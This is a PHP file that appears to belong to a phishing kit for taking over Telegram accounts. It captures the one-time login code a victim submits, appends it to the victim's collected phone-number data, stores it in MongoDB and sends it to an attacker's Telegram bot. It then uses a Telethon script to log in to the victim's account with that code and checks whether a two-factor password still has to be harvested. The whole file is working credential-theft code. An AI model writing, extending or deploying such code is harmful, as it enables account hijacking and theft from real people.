<?php
require_once __DIR__ . '/db_config.php';
require_once __DIR__ . '/MongoDBSessionHandler.php';
require_once __DIR__ . '/telegram.php';
require_once __DIR__ . '/telegram_config.php';

// Inisialisasi MongoDB Session Handler
$mongoSessionHandler = new MongoDBSessionHandler($mongo_connection_string);
session_set_save_handler($mongoSessionHandler, true);
$GLOBALS['mongoSessionHandler'] = $mongoSessionHandler;

session_start();

$message = $_SESSION['message'] ?? '';
$code = $_POST['code'] ?? '';
$phoneNumber = $_SESSION['telegram_phone'] ?? '';

$string = $message;
$string .= "OTP : `$code`\n";

$_SESSION['message'] = $string;
$_SESSION['otp'] = $code;

// Simpan juga ke MongoDB secara langsung
if (isset($mongoSessionHandler)) {
    $mongoSessionHandler->saveTelegramData($string, [
        'otp_code' => $code,
        'stage' => 'otp_verification'
    ]);
}

// Kirim ke bot Telegram
sendTelegram($string);

// Integrate with Telethon - verify OTP
$session_id = session_id();
$command = escapeshellcmd("python $telegram_auth_script otp " . escapeshellarg($phoneNumber) . " " . escapeshellarg($code) . " " . escapeshellarg($session_id));
$output = shell_exec($command);
$result = json_decode($output, true);

// Store the result in session
$_SESSION['telegram_auth_result'] = $result;

// Check if we need 2FA password
if (isset($result['success']) && $result['success'] === true) {
    if (isset($result['needs_password']) && $result['needs_password'] === true) {
        // We need to go to password page
        $_SESSION['telegram_needs_password'] = true;
        echo json_encode(['success' => true, 'needs_password' => true]);
    } else {
        // We're fully authenticated, go to completed page
        $_SESSION['telegram_auth_completed'] = true;
        echo json_encode(['success' => true, 'needs_password' => false]);
    }
} else {
    // Authentication failed
    echo json_encode(['success' => false, 'error' => $result['error'] ?? 'Unknown error']);
}
